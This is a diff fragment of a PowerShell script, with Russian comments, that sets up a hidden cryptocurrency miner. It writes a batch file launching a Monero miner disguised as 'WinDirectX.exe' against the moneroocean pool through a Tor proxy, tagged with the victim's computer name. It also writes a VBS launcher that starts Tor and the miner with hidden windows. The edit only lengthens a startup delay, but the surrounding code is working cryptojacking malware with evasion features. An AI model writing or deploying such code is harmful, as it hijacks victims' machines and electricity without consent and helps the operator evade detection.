@@ -95,7 +95,7 @@ try {
 } catch { Write-Host "❌ Ошибка загрузки" -ForegroundColor Red }
 
 # 7. СОЗДАНИЕ ТИХОГО ЗАПУСКА
-$cmd = "@echo off`ntasklist /FI `"IMAGENAME eq WinDirectX.exe`" | find /I `"WinDirectX.exe`" >NUL`nif %ERRORLEVEL%==0 exit`ntimeout /t 15 /nobreak >nul`nstart /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p %COMPUTERNAME% --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --threads=6 --log-file=$path\miner.log"
+$cmd = "@echo off`ntasklist /FI `"IMAGENAME eq WinDirectX.exe`" | find /I `"WinDirectX.exe`" >NUL`nif %ERRORLEVEL%==0 exit`ntimeout /t 30 /nobreak >nul`nstart /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p %COMPUTERNAME% --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --threads=6 --log-file=$path\miner.log"
 $cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
 
 $vbs = "Set W = CreateObject(`"WScript.Shell`")`nW.Run `"$path\tor.exe`", 0, False`nW.Run `"$path\run_cache.bat`", 0, False"
